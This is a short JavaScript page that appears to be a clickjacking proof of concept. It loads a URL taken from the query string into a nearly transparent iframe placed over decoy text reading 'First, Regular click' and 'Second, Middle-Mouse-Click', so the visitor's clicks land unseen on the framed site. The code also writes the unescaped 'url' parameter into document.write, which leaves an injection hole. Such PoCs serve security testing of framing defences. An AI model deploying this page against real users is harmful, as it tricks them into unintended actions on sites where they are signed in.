const params = new URLSearchParams(window.location.search);
const iframeUrl = params.get('url') || 'https://example.com/';

document.open();
document.write(`
    <style>
        iframe {
            position: relative;
            width: 1700px;
            height: 900px;
            opacity: 0.1;
            z-index: 2;
        }
        div {
            position: absolute;
            top: 375px;
            left: 800px;
            z-index: 1;
        }
        .blabla {
            position: absolute;
            top: 400px;
            left: 800px;
            z-index: 1;
        }
    </style>
    <div>Second, Middle-Mouse-Click</div>
    <div class="blabla">First, Regular click</div>
    <iframe src="${iframeUrl}"></iframe>
`);
document.close();